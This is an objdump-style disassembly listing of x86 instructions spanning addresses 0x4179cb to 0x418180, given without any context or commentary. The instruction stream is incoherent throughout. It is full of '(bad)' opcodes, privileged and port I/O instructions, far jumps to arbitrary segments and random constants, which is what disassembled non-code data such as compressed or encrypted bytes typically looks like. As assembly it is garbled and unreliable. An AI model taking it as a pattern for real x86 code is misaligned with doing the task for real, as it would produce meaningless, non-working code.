  4179cb:	cmp    al,0x9b
  4179cd:	(bad)  
  4179ce:	stos   DWORD PTR es:[edi],eax
  4179cf:	loope  0x417967
  4179d1:	adc    edx,ebp
  4179d3:	es in  eax,0xdb
  4179d6:	push   ds
  4179d7:	add    al,0x8d
  4179d9:	fs and al,al
  4179dc:	mov    DWORD PTR gs:[ecx+esi*8-0x64439a4f],ecx
  4179e4:	cmp    al,0x32
  4179e6:	cmovno esp,DWORD PTR [edi]
  4179e9:	pop    ecx
  4179ea:	push   ds
  4179eb:	inc    esi
  4179ec:	xchg   ebx,eax
  4179ed:	into   
  4179ee:	retf   
  4179ef:	jbe    0x417a28
  4179f1:	push   ecx
  4179f2:	fisttp QWORD PTR [edx]
  4179f4:	push   ss
  4179f5:	or     eax,0xa6b84209
  4179fa:	daa    
  4179fb:	sahf   
  4179fc:	and    DWORD PTR [ecx+edi*8-0xe],ebx
  417a00:	xor    WORD PTR [ecx-0x78],cx
  417a04:	adc    bh,BYTE PTR [esi+0x6d5ee3c0]
  417a0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a0b:	stos   BYTE PTR es:[edi],al
  417a0c:	pop    esi
  417a0d:	outs   dx,DWORD PTR ds:[esi]
  417a0e:	jo     0x417a87
  417a10:	je     0x4179b1
  417a12:	stos   BYTE PTR es:[edi],al
  417a13:	mov    esi,0x78a13ffa
  417a18:	call   0x1dc6:0xd9c53371
  417a1f:	imul   esi,DWORD PTR [ebp+0x5d],0x7
  417a23:	aas    
  417a24:	(bad)  
  417a25:	xor    DWORD PTR [ebx+esi*2+0x1ee2d7f2],esi
  417a2c:	xchg   BYTE PTR [ecx+ebp*4],ah
  417a2f:	or     edx,DWORD PTR [edx]
  417a31:	mov    ebx,0x84d4843
  417a36:	and    BYTE PTR [ecx-0x41ed7670],0x2c
  417a3d:	loop   0x417abd
  417a3f:	dec    ebp
  417a40:	retf   
  417a41:	in     al,0xbb
  417a43:	xchg   ebx,eax
  417a44:	(bad)  
  417a45:	shr    DWORD PTR ds:0xc6980769,1
  417a4b:	mov    cl,0xe0
  417a4d:	(bad)  
  417a4e:	scas   eax,DWORD PTR es:[edi]
  417a4f:	data16 test al,0x46
  417a52:	push   ds
  417a53:	pushf  
  417a54:	push   ss
  417a55:	xchg   ebx,edx
  417a57:	mov    ds:0xc5e5ed99,al
  417a5c:	rcr    DWORD PTR [edx],1
  417a5e:	jbe    0x417a13
  417a60:	mov    eax,0x30b6767b
  417a65:	lods   al,BYTE PTR ds:[esi]
  417a66:	outs   dx,DWORD PTR ds:[esi]
  417a67:	cld    
  417a68:	(bad)  
  417a69:	fwait
  417a6a:	ds cmp al,0xc5
  417a6d:	pop    ss
  417a6e:	mov    dl,0xee
  417a70:	cld    
  417a71:	xchg   esi,eax
  417a72:	outs   dx,DWORD PTR ds:[esi]
  417a73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a74:	sbb    ch,BYTE PTR [ecx]
  417a76:	xchg   edx,eax
  417a77:	fld    QWORD PTR [eax]
  417a79:	push   edi
  417a7a:	aaa    
  417a7b:	rcr    ebx,0xfe
  417a7e:	ja     0x417aca
  417a80:	xlat   BYTE PTR ds:[ebx]
  417a81:	xchg   esi,eax
  417a82:	fsub   QWORD PTR [edi]
  417a84:	test   BYTE PTR [ebp+0x24669697],cl
  417a8a:	cmp    al,0x64
  417a8c:	pop    ebx
  417a8d:	push   ds
  417a8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a8f:	les    ecx,FWORD PTR [edi]
  417a91:	icebp  
  417a92:	es jns 0x417acd
  417a95:	inc    ecx
  417a96:	mov    esi,0x6d2dfa93
  417a9b:	arpl   WORD PTR [esi],si
  417a9d:	call   0xce68:0xbaedb9ba
  417aa4:	dec    eax
  417aa5:	pop    ss
  417aa6:	mov    edx,0x245d0b0c
  417aab:	in     al,0x3c
  417aad:	lea    edi,[esi+0xeed1031]
  417ab3:	jo     0x417a90
  417ab5:	dec    esi
  417ab6:	xchg   edi,eax
  417ab7:	sar    DWORD PTR [edx-0x5e],1
  417aba:	loopne 0x417a79
  417abc:	mov    esi,0x29d069d0
  417ac1:	cmp    eax,0xa803a921
  417ac6:	dec    edi
  417ac7:	lock and al,0x3c
  417aca:	jbe    0x417afc
  417acc:	lahf   
  417acd:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417acf:	in     al,dx
  417ad0:	add    BYTE PTR [edx],dl
  417ad2:	es sbb eax,0x2a2d5f3f
  417ad8:	mov    esp,DWORD PTR [ebp-0x3d94ec9c]
  417ade:	loop   0x417b3d
  417ae0:	test   eax,0x5b72d57f
  417ae5:	dec    esp
  417ae6:	in     al,0x5a
  417ae8:	out    0x5,eax
  417aea:	adc    BYTE PTR [ebp-0x6b66c964],0x5e
  417af1:	cmp    BYTE PTR [edi+ecx*2+0x7],ch
  417af5:	mov    ah,0xe9
  417af7:	xchg   esp,eax
  417af8:	sti    
  417af9:	push   esi
  417afa:	adc    BYTE PTR [ebx-0x35],ah
  417afd:	push   es
  417afe:	hlt    
  417aff:	cli    
  417b00:	mov    eax,ds:0x614544b8
  417b05:	push   es
  417b06:	add    ecx,ebp
  417b08:	or     DWORD PTR [ebp+0x4e4591b6],ecx
  417b0e:	cmp    al,0x50
  417b10:	add    al,0xe0
  417b12:	mov    al,0x65
  417b14:	or     ecx,DWORD PTR [edi-0x7d685dc3]
  417b1a:	fsub   DWORD PTR [edx+eiz*4+0x3f]
  417b1e:	in     eax,0xe6
  417b20:	call   0x6d7a:0x652fee12
  417b27:	stos   DWORD PTR es:[edi],eax
  417b28:	adc    al,al
  417b2a:	cli    
  417b2b:	inc    edx
  417b2c:	inc    edi
  417b2d:	xchg   DWORD PTR [ebx],esp
  417b2f:	rol    dl,cl
  417b31:	out    dx,al
  417b32:	add    DWORD PTR [esi],esi
  417b34:	jmp    0xd3e4:0xf3e8a37a
  417b3b:	imul   edx,DWORD PTR [edx-0x2cc5c8d4],0xffffffb1
  417b42:	xchg   esp,eax
  417b43:	shl    DWORD PTR [ebp+0x7],0x3b
  417b47:	cli    
  417b48:	sbb    DWORD PTR [eax-0x16],edi
  417b4b:	dec    ebp
  417b4c:	xchg   esi,eax
  417b4d:	leave  
  417b4e:	jmp    0x417b74
  417b50:	rcl    DWORD PTR [ebx-0x5f],cl
  417b53:	shl    DWORD PTR [ebx],0x19
  417b56:	pop    edx
  417b57:	test   al,0xf6
  417b59:	mov    ebx,DWORD PTR [eax+0x41]
  417b5c:	out    0x1e,al
  417b5e:	jmp    0xa38c:0x7d701a19
  417b65:	(bad)  
  417b66:	scas   eax,DWORD PTR es:[edi]
  417b67:	add    eax,0xd69f01f0
  417b6c:	int3   
  417b6d:	push   edx
  417b6e:	out    dx,eax
  417b6f:	mov    edi,0x3b812af3
  417b74:	mov    bh,0x59
  417b76:	aad    0x64
  417b78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b79:	mov    esp,DWORD PTR [eax-0x4e0bb390]
  417b7f:	pop    ecx
  417b80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b81:	dec    ebx
  417b82:	pop    edi
  417b83:	psrad  mm4,mm0
  417b86:	xchg   ecx,eax
  417b87:	xor    edx,DWORD PTR [ebx]
  417b89:	adc    eax,0x923cc61f
  417b8e:	in     al,0x6e
  417b90:	ror    BYTE PTR [eax+0x14],1
  417b93:	sbb    eax,0x8a3c4f41
  417b98:	pop    eax
  417b99:	xchg   esi,eax
  417b9a:	jmp    0x116:0x1d93b00b
  417ba1:	inc    esp
  417ba2:	add    BYTE PTR [eax-0x102c40b6],bh
  417ba8:	pop    es
  417ba9:	ret    0x51cd
  417bac:	sbb    esp,DWORD PTR [ebp-0x45e5bddc]
  417bb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bb3:	adc    DWORD PTR [edx-0x4fbe5754],esp
  417bb9:	mov    al,0xa6
  417bbb:	cwde   
  417bbc:	mov    esi,?
  417bbe:	jmp    0x417bbd
  417bc0:	jge    0x417b50
  417bc2:	fwait
  417bc3:	adc    esi,esi
  417bc5:	loopne 0x417bae
  417bc7:	sub    ebx,DWORD PTR [eax]
  417bc9:	xor    ch,BYTE PTR ds:0x39f09aea
  417bcf:	stos   DWORD PTR es:[edi],eax
  417bd0:	cmp    al,bh
  417bd2:	ja     0x417b70
  417bd4:	mov    WORD PTR [edi+eax*8+0x8],ss
  417bd8:	mov    ds:0x2b2ac300,eax
  417bdd:	dec    eax
  417bde:	fisub  WORD PTR ds:0xf94b0604
  417be4:	jo     0x417bf4
  417be6:	inc    esi
  417be7:	adc    eax,0x837cf376
  417bec:	dec    eax
  417bed:	dec    esp
  417bee:	ja     0x417c39
  417bf0:	fbld   TBYTE PTR [edx+0x6e1487df]
  417bf6:	mov    BYTE PTR [edx+edi*2-0x1],al
  417bfa:	xchg   edi,eax
  417bfb:	mov    ch,0x29
  417bfd:	or     ebx,DWORD PTR [esi+0x22ec3c03]
  417c03:	xchg   edi,eax
  417c04:	mov    cl,0xdf
  417c06:	stc    
  417c07:	(bad)  
  417c08:	sbb    bh,bl
  417c0a:	push   esi
  417c0b:	push   es
  417c0c:	fdivr  DWORD PTR [ebx+0xd]
  417c0f:	dec    eax
  417c10:	sbb    al,0xdf
  417c12:	ja     0x417b99
  417c14:	jg     0x417c68
  417c16:	xor    dh,BYTE PTR [edi]
  417c18:	mov    ch,0x93
  417c1a:	ss popa 
  417c1c:	adc    esi,DWORD PTR [eax]
  417c1e:	dec    eax
  417c1f:	sbb    al,0x5e
  417c21:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  417c23:	cmc    
  417c24:	(bad)  [ecx+0xa81ce3a]
  417c2a:	scas   al,BYTE PTR es:[edi]
  417c2b:	les    edi,FWORD PTR [ebx+edx*4+0x60]
  417c2f:	mov    dh,0x1f
  417c31:	je     0x417bd7
  417c33:	ds aaa 
  417c35:	bound  edi,QWORD PTR [ebx]
  417c37:	push   ds
  417c38:	jl     0x417c4b
  417c3a:	aas    
  417c3b:	jle    0x417c53
  417c3d:	loop   0x417c9b
  417c3f:	push   eax
  417c40:	cmp    al,0x52
  417c42:	jle    0x417c2c
  417c44:	aam    0x58
  417c46:	sbb    BYTE PTR [esi+0x4d164913],0xe2
  417c4d:	push   edi
  417c4e:	pusha  
  417c4f:	add    al,0x4
  417c51:	xchg   esp,eax
  417c52:	adc    BYTE PTR [esi+0x3],ch
  417c55:	repz jge 0x417bf7
  417c58:	stc    
  417c59:	cmp    BYTE PTR [esi-0x51b54464],bh
  417c5f:	repnz push es
  417c61:	enter  0x8bc,0x2f
  417c65:	repnz cwde 
  417c67:	mov    BYTE PTR [edx+0x5ee7be21],dh
  417c6d:	fidivr DWORD PTR [ecx]
  417c6f:	adc    bh,BYTE PTR [edx+0x7f]
  417c72:	pop    edx
  417c73:	mov    edi,0xef47aba2
  417c78:	jge    0x417bfb
  417c7a:	inc    eax
  417c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c7c:	cli    
  417c7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c7e:	mov    cl,0x29
  417c80:	pop    eax
  417c81:	iret   
  417c82:	mov    ebp,0xb7e45e84
  417c87:	and    eax,0x7b499425
  417c8c:	jb     0x417c79
  417c8e:	(bad)  
  417c8f:	test   ch,ch
  417c91:	hlt    
  417c92:	ja     0x417d00
  417c94:	pop    edx
  417c95:	sub    BYTE PTR [ebx],bl
  417c97:	retf   0x6c82
  417c9a:	dec    esp
  417c9b:	push   edi
  417c9c:	adc    BYTE PTR [ecx+0x32],al
  417c9f:	test   eax,0x24886897
  417ca4:	adc    esi,DWORD PTR [edi-0x72fa61cb]
  417caa:	(bad)  
  417cab:	out    0x73,al
  417cad:	ret    
  417cae:	neg    DWORD PTR [ebx-0x1c672b37]
  417cb4:	lahf   
  417cb5:	adc    eax,0xd0ddbcb4
  417cba:	xor    bh,bl
  417cbc:	add    eax,0x9ab3f13
  417cc1:	pop    ds
  417cc2:	or     dl,al
  417cc4:	das    
  417cc5:	push   edi
  417cc6:	sub    ecx,esp
  417cc8:	in     eax,0x7
  417cca:	ins    DWORD PTR es:[edi],dx
  417ccb:	or     eax,0xac337a52
  417cd0:	mov    bh,0xad
  417cd2:	bound  ebp,QWORD PTR [edi]
  417cd4:	fcom   QWORD PTR [ebx+0x27]
  417cd7:	and    al,0xe3
  417cd9:	mov    ecx,?
  417cdb:	lea    edi,[esi-0x63]
  417cde:	sbb    al,BYTE PTR [edi+edi*8]
  417ce1:	outs   dx,BYTE PTR ds:[esi]
  417ce2:	jmp    0x4f62661f
  417ce7:	mov    dh,0x85
  417ce9:	push   es
  417cea:	and    DWORD PTR [ebx],eax
  417cec:	and    eax,0x38530237
  417cf1:	pop    edi
  417cf2:	mov    WORD PTR [ebp-0x3dd4385e],fs
  417cf8:	and    BYTE PTR [ebx+0x25],dl
  417cfb:	dec    eax
  417cfc:	out    0x49,eax
  417cfe:	jbe    0x417d6a
  417d00:	sbb    ebp,DWORD PTR [ecx+0x17]
  417d03:	mov    edx,0x87f476c5
  417d08:	dec    esp
  417d09:	pop    ebx
  417d0a:	lea    ebp,[edx-0xa6a749d]
  417d10:	call   0xfde32230
  417d15:	cs stc 
  417d17:	adc    eax,0x399558ab
  417d1c:	call   0x3d67810a
  417d21:	adc    eax,0xc6507b87
  417d26:	xlat   BYTE PTR ds:[ebx]
  417d27:	inc    edi
  417d28:	sub    DWORD PTR [edx+edi*8],edi
  417d2b:	sub    eax,0xe4e8cafd
  417d30:	ins    DWORD PTR es:[edi],dx
  417d31:	in     al,0x5a
  417d33:	push   ebp
  417d34:	pop    eax
  417d35:	ins    BYTE PTR es:[edi],dx
  417d36:	in     eax,dx
  417d37:	aas    
  417d38:	les    edx,FWORD PTR [edx+0x4fde46a7]
  417d3e:	sub    dh,BYTE PTR [ebp-0x28]
  417d41:	mov    bh,0xa3
  417d43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d44:	call   0x1168:0xd0fc1389
  417d4b:	hlt    
  417d4c:	das    
  417d4d:	(bad)  
  417d4e:	pop    ss
  417d4f:	sbb    eax,0xa23237ea
  417d54:	pop    eax
  417d55:	add    al,0x9f
  417d57:	xchg   ebx,eax
  417d58:	popa   
  417d59:	cs adc dh,0x50
  417d5d:	add    ebx,DWORD PTR [eax+0x4a8cff94]
  417d63:	mov    ds:0x19e3ea20,al
  417d68:	jecxz  0x417d72
  417d6a:	jmp    0x421c8c61
  417d6f:	push   ss
  417d70:	rcr    DWORD PTR [ebx+0x69],1
  417d73:	xchg   ebx,eax
  417d74:	add    BYTE PTR [ebp-0x5d8a27bc],dl
  417d7a:	xor    edi,esi
  417d7c:	or     DWORD PTR [edx+0x3a],0xfffffff0
  417d80:	jae    0x417dae
  417d82:	inc    ecx
  417d83:	xor    ebx,DWORD PTR [ecx]
  417d85:	pop    esp
  417d86:	enter  0x5f78,0x94
  417d8a:	stc    
  417d8b:	cmp    al,0x1
  417d8d:	cli    
  417d8e:	jge    0x417de1
  417d90:	shl    BYTE PTR [ebx-0x66],0xc5
  417d94:	aas    
  417d95:	mov    dh,0xa8
  417d97:	jmp    0x600d:0x153f4d0a
  417d9e:	call   0x304f0c4c
  417da3:	xor    al,0x70
  417da5:	in     al,0x40
  417da7:	scas   al,BYTE PTR es:[edi]
  417da8:	ret    0xf5d2
  417dab:	push   edi
  417dac:	xchg   edi,eax
  417dad:	xor    eax,0x2711b40c
  417db2:	pop    edi
  417db3:	in     al,0x94
  417db5:	mov    WORD PTR [edi-0x78ad34ce],ds
  417dbb:	pop    ebx
  417dbc:	mov    DWORD PTR [ebp-0x39],0xf655eeb3
  417dc3:	push   0xc540a061
  417dc8:	push   ss
  417dc9:	push   es
  417dca:	fst    DWORD PTR [eax]
  417dcc:	push   DWORD PTR [ecx-0x78]
  417dcf:	imul   edx,ebp,0x16a0bbd7
  417dd5:	or     al,0xec
  417dd7:	pop    ss
  417dd8:	jmp    0xdb26438a
  417ddd:	out    dx,eax
  417dde:	lahf   
  417ddf:	and    al,0xc4
  417de1:	mov    al,ds:0x418915d4
  417de6:	cli    
  417de7:	jge    0x417dcb
  417de9:	push   esp
  417dea:	loopne 0x417e2f
  417dec:	pop    ecx
  417ded:	jp     0x417e25
  417def:	shl    dh,cl
  417df1:	lods   al,BYTE PTR ds:[esi]
  417df2:	inc    ebp
  417df3:	xor    BYTE PTR [ebx+0x6e7046f5],ch
  417df9:	outs   dx,BYTE PTR ds:[esi]
  417dfa:	shr    DWORD PTR [edi],1
  417dfc:	(bad)  
  417dfd:	xor    bh,cl
  417dff:	fidivr WORD PTR [edx-0x3f]
  417e02:	int    0x7f
  417e04:	xchg   edx,eax
  417e05:	ror    BYTE PTR [esi+0x2f],0x8d
  417e09:	xchg   BYTE PTR [edx-0x6e0a9634],al
  417e0f:	adc    ch,BYTE PTR [ebp+0x57]
  417e12:	scas   al,BYTE PTR es:[edi]
  417e13:	popa   
  417e14:	popf   
  417e15:	add    bl,al
  417e17:	xchg   ebx,eax
  417e18:	mov    DWORD PTR [edi+0x4492dfa1],edi
  417e1e:	out    0xc5,eax
  417e20:	das    
  417e21:	test   ebp,eax
  417e23:	jno    0x417e76
  417e25:	sbb    eax,0x4eb2257a
  417e2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e2b:	pop    ebx
  417e2c:	xor    BYTE PTR [eax-0x1a6e7a71],0x0
  417e33:	pcmpeqw mm3,mm4
  417e36:	sbb    ebx,esp
  417e38:	inc    eax
  417e39:	sub    BYTE PTR [edi+0x54ac2ef2],al
  417e3f:	or     al,0xdf
  417e41:	or     ah,dh
  417e43:	sub    eax,0x85619418
  417e48:	addr16 in al,dx
  417e4a:	dec    ecx
  417e4b:	pop    ss
  417e4c:	xor    al,BYTE PTR [eax-0x6e]
  417e4f:	outs   dx,DWORD PTR ds:[esi]
  417e50:	test   BYTE PTR [ebx-0x31],dh
  417e53:	pop    esi
  417e54:	and    al,0x19
  417e56:	and    al,0x27
  417e58:	js     0x417de5
  417e5a:	pop    edx
  417e5b:	(bad)  
  417e5c:	ror    BYTE PTR [eax-0x7eb36b6],0xac
  417e63:	sub    eax,0xa0c8fce1
  417e68:	cmp    eax,0x23692953
  417e6d:	sub    DWORD PTR [esi+0x15b86147],esi
  417e73:	dec    edi
  417e74:	sbb    DWORD PTR [esi],ebx
  417e76:	fstp   TBYTE PTR ds:0x8cd4678a
  417e7c:	mov    eax,0x3f98caa6
  417e81:	call   0xdc65dee6
  417e86:	repnz cmp BYTE PTR [esi-0x4d],cl
  417e8a:	xchg   DWORD PTR [edi+ebp*1+0x31],eax
  417e8e:	jns    0x417e1b
  417e90:	repz or ecx,DWORD PTR [ecx+0x63e3d244]
  417e97:	popa   
  417e98:	cmp    BYTE PTR [ebx-0x6903ff0b],ah
  417e9e:	xor    ecx,0xcf945966
  417ea4:	mov    dh,0x82
  417ea6:	xlat   BYTE PTR ds:[ebx]
  417ea7:	dec    eax
  417ea9:	inc    ecx
  417eaa:	add    ebp,DWORD PTR [edx-0x53]
  417ead:	leave  
  417eae:	xor    al,0x4e
  417eb0:	add    eax,0x7d720ebb
  417eb5:	cmp    DWORD PTR [edi+0x7],eax
  417eb8:	test   eax,0xa6b5b311
  417ebd:	leave  
  417ebe:	sub    DWORD PTR [eax+0x1e476ce3],eax
  417ec4:	scas   al,BYTE PTR es:[edi]
  417ec5:	fmul   DWORD PTR [edi]
  417ec7:	and    ecx,DWORD PTR [ebx-0x45e86907]
  417ecd:	xchg   esi,eax
  417ece:	(bad)  
  417ecf:	xor    BYTE PTR [ebp+0x6d8d34a7],ah
  417ed5:	inc    ebp
  417ed6:	inc    esi
  417ed7:	into   
  417ed8:	(bad)  [edi+0x3e888120]
  417ede:	add    ebx,esi
  417ee0:	fdivr  QWORD PTR [edx+0x31cc4490]
  417ee6:	and    DWORD PTR [ebp-0x4c],0x71348ff1
  417eed:	fsub   st,st(5)
  417eef:	test   al,0xd7
  417ef1:	je     0x417efb
  417ef3:	mov    eax,0xdf95970d
  417ef8:	retf   0x3cfe
  417efb:	sbb    edi,edi
  417efd:	rcr    DWORD PTR [esi+0x1a],cl
  417f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f01:	push   esp
  417f02:	(bad)  
  417f03:	cdq    
  417f04:	xchg   edi,eax
  417f05:	xor    eax,0x318673bf
  417f0a:	aam    0xa9
  417f0c:	lods   eax,DWORD PTR ds:[esi]
  417f0d:	mov    ecx,0xc7db7420
  417f12:	out    0xd8,eax
  417f14:	ins    DWORD PTR es:[edi],dx
  417f15:	jo     0x417ecf
  417f17:	cmp    cl,0xfc
  417f1a:	stos   DWORD PTR es:[edi],eax
  417f1b:	jl     0x417ec5
  417f1d:	repz aaa 
  417f1f:	xchg   edi,eax
  417f20:	jbe    0x417f92
  417f22:	mov    fs,ebx
  417f24:	xchg   ebp,eax
  417f25:	pop    ebp
  417f26:	test   BYTE PTR [ebp+0x2d],0x2f
  417f2a:	pop    es
  417f2b:	pop    esi
  417f2c:	push   ecx
  417f2d:	out    dx,al
  417f2e:	xchg   esi,eax
  417f2f:	rsm    
  417f31:	mov    dl,bh
  417f33:	fiadd  WORD PTR [ebx-0x4dab1c26]
  417f39:	dec    eax
  417f3a:	sub    al,0x54
  417f3c:	sbb    dh,BYTE PTR [ecx+0x6e]
  417f3f:	cmp    BYTE PTR [ebx+0x1b],0x65
  417f43:	pop    ecx
  417f44:	jno    0x417fb8
  417f46:	addr16 in eax,0xad
  417f49:	sbb    ah,BYTE PTR [esi]
  417f4b:	jmp    0xbfad:0x49cbbe07
  417f52:	mov    al,0x8a
  417f54:	mov    BYTE PTR [ebp-0x3e45eabd],dh
  417f5a:	pop    eax
  417f5b:	pop    edx
  417f5c:	cwde   
  417f5d:	jmp    0xb344c332
  417f62:	sbb    ebx,DWORD PTR [esi-0x35]
  417f65:	mov    ds:0xc3f0f658,al
  417f6a:	ins    DWORD PTR es:[edi],dx
  417f6b:	lock aam 0xa9
  417f6e:	pop    DWORD PTR [ebx]
  417f70:	mov    bh,0xb7
  417f72:	fs jl  0x417f54
  417f75:	adc    al,0xfd
  417f77:	jae    0x417fac
  417f79:	push   edx
  417f7a:	aad    0xb1
  417f7c:	fwait
  417f7d:	das    
  417f7e:	pusha  
  417f7f:	hlt    
  417f80:	jecxz  0x417f71
  417f82:	aad    0x2d
  417f84:	mov    ebp,0x35e0f016
  417f89:	sbb    al,0xe5
  417f8b:	addr16 out 0xed,eax
  417f8e:	fsub   QWORD PTR [ebx-0x50]
  417f91:	fidivr WORD PTR [edi+0x25548b0d]
  417f97:	jbe    0x417f8b
  417f99:	push   0xfffffff0
  417f9b:	sub    DWORD PTR [esi],0x90ece659
  417fa1:	out    dx,eax
  417fa2:	mov    cl,0xe
  417fa4:	in     eax,dx
  417fa5:	and    DWORD PTR [edi-0x6a],edx
  417fa8:	jnp    0x417fdf
  417faa:	dec    ecx
  417fab:	ss ins BYTE PTR es:[edi],dx
  417fad:	add    DWORD PTR [esp+ebx*2-0x57],esi
  417fb1:	test   BYTE PTR [ebx-0x2b51e2b0],al
  417fb7:	mov    eax,DWORD PTR [edi*8+0x4df1e22e]
  417fbe:	into   
  417fbf:	loope  0x417f71
  417fc1:	push   eax
  417fc2:	mov    eax,edx
  417fc4:	scas   al,BYTE PTR es:[edi]
  417fc5:	iret   
  417fc6:	sar    DWORD PTR [ebx+0x3c],cl
  417fc9:	xchg   edi,eax
  417fca:	cmp    al,0x3f
  417fcc:	adc    ah,BYTE PTR ds:0x7e4347dd
  417fd2:	lods   eax,DWORD PTR ds:[esi]
  417fd3:	mov    ecx,0xb93a1e3a
  417fd8:	popf   
  417fd9:	ja     0x417f99
  417fdb:	or     DWORD PTR [edi+esi*8+0x51],edx
  417fdf:	hlt    
  417fe0:	imul   ebp,DWORD PTR [ebx-0x37acd88],0x4ec5986d
  417fea:	in     al,dx
  417feb:	arpl   si,sp
  417fed:	popa   
  417fee:	or     BYTE PTR [edx+0x3f50d0e1],dh
  417ff4:	adc    al,0xd9
  417ff6:	dec    eax
  417ff7:	xchg   ebp,eax
  417ff8:	sub    DWORD PTR [edx+0x44db1752],0x3e
  417fff:	pop    es
  418000:	push   cs
  418001:	and    ebp,0xffffffe8
  418004:	lahf   
  418005:	cmp    BYTE PTR [ecx+ebp*2-0xb663a10],dl
  41800c:	jecxz  0x418074
  41800e:	pop    edx
  41800f:	ins    DWORD PTR es:[edi],dx
  418010:	mov    bl,0xdb
  418012:	xor    BYTE PTR [esp+edx*8],al
  418015:	ficomp WORD PTR [edi+0x29]
  418018:	jno    0x418019
  41801a:	scas   al,BYTE PTR es:[edi]
  41801b:	sub    eax,0xc435977f
  418020:	and    BYTE PTR [ebx-0x5efc7054],al
  418026:	inc    ebp
  418027:	mov    bh,0xc8
  418029:	push   es
  41802a:	popf   
  41802b:	and    al,0x64
  41802d:	inc    ecx
  41802e:	int    0xb6
  418030:	inc    ebx
  418031:	icebp  
  418032:	xchg   edi,eax
  418033:	ret    
  418034:	push   0x87c9672f
  418039:	mov    eax,ds:0xb1b1e90a
  41803e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41803f:	stos   DWORD PTR es:[edi],eax
  418040:	popf   
  418041:	(bad)  
  418042:	mov    ds:0x8049d98a,eax
  418047:	sub    al,0x41
  418049:	pop    ss
  41804a:	into   
  41804b:	cmp    eax,0xb9587640
  418050:	add    DWORD PTR [esi+0x66],edx
  418053:	lock cs icebp 
  418056:	test   al,0x5c
  418058:	jle    0x418047
  41805a:	nop
  41805b:	iret   
  41805c:	pop    edi
  41805d:	mov    eax,0x239938c1
  418062:	cdq    
  418063:	sub    eax,DWORD PTR [eax]
  418065:	clc    
  418066:	iret   
  418067:	js     0x4180d1
  418069:	inc    ebp
  41806a:	adc    ecx,DWORD PTR [ebx-0x254976f9]
  418070:	aas    
  418071:	icebp  
  418072:	sti    
  418073:	jmp    0x4336f2b3
  418078:	inc    ebp
  418079:	or     eax,0x11b3ad1d
  41807e:	cs pop es
  418080:	adc    eax,DWORD PTR ds:0x9cd185a3
  418086:	(bad)  
  418087:	push   eax
  418088:	push   edx
  418089:	and    cl,al
  41808b:	adc    DWORD PTR es:[eax],ebp
  41808e:	pushf  
  41808f:	fucomi st,st(7)
  418091:	es js  0x418061
  418094:	jg     0x418018
  418096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418097:	jmp    0x7c2:0x24d1f67f
  41809e:	jo     0x418089
  4180a0:	add    BYTE PTR [edx],bl
  4180a2:	inc    ebx
  4180a3:	pop    ecx
  4180a4:	add    ch,cl
  4180a6:	data16 and al,0x7c
  4180a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180aa:	fldenv [ebx+0x2afab725]
  4180b0:	jmp    0x4180a7
  4180b2:	fisub  DWORD PTR [edi-0x1cf69726]
  4180b8:	and    DWORD PTR [ecx-0xc1c0467],eax
  4180be:	call   0x127ff7ac
  4180c3:	es push ebp
  4180c5:	push   esi
  4180c6:	dec    ecx
  4180c7:	dec    esp
  4180c8:	fmul   DWORD PTR [ecx-0x5fcd78aa]
  4180ce:	(bad)  
  4180cf:	mov    eax,0xa52df706
  4180d4:	push   ecx
  4180d5:	jg     0x4180b2
  4180d7:	sub    BYTE PTR [edi],0x4b
  4180da:	les    eax,FWORD PTR [esi+0x2d1da8ee]
  4180e0:	sub    dh,BYTE PTR [esi+edx*8-0x6ce0edab]
  4180e7:	sbb    al,0x99
  4180e9:	popf   
  4180ea:	dec    edx
  4180eb:	mov    ecx,0x737f4cef
  4180f0:	sub    eax,0x1c72887e
  4180f5:	cmp    DWORD PTR [ecx],ebx
  4180f7:	cmp    DWORD PTR ds:0x1734dae7,eax
  4180fd:	test   edi,ecx
  4180ff:	cmp    al,0x59
  418101:	repz call 0x4673:0xf372dc67
  418109:	jae    0x418163
  41810b:	ds in  eax,dx
  41810d:	mov    eax,0x12e94b77
  418112:	jmp    0x7c6e0fb2
  418117:	cmp    ecx,edx
  418119:	call   0xb6eb745b
  41811e:	div    DWORD PTR [edx]
  418120:	pop    ss
  418121:	xchg   esi,eax
  418122:	adc    BYTE PTR [ebp+0x61],dh
  418125:	mov    edx,0xfd7e1c7c
  41812a:	adc    edx,esi
  41812c:	inc    edx
  41812d:	in     al,dx
  41812e:	imul   esi,esi,0xfae62db7
  418134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418135:	xor    DWORD PTR [edi+0x53],0xffffff82
  418139:	ffreep st(4)
  41813b:	int3   
  41813c:	(bad)
  418140:	fdivr  st(6),st
  418142:	ja     0x41816b
  418144:	lds    esp,FWORD PTR [esp+esi*8+0x1c90ab8b]
  41814b:	sahf   
  41814c:	(bad)  [edx]
  41814e:	pop    edx
  41814f:	dec    DWORD PTR [esi-0xf721bfa]
  418155:	push   eax
  418156:	pop    edi
  418157:	shl    DWORD PTR [ebx+0x431d3009],1
  41815d:	cli    
  41815e:	xor    DWORD PTR [edi-0x74],ecx
  418161:	cmp    eax,0x9a9fcff9
  418166:	xchg   esp,eax
  418167:	mov    bl,0x28
  418169:	(bad)  
  41816a:	sub    eax,0x7058906b
  41816f:	adc    cl,BYTE PTR [ebx-0x32]
  418172:	push   cs
  418173:	xlat   BYTE PTR ds:[ebx]
  418174:	push   esi
  418175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418176:	(bad)  
  418177:	daa    
  418178:	je     0x4181d1
  41817a:	xor    cl,dl
  41817c:	push   cs
  41817d:	pop    eax
  41817e:	adc    al,0x59
  418180:	jae    0x4181ea
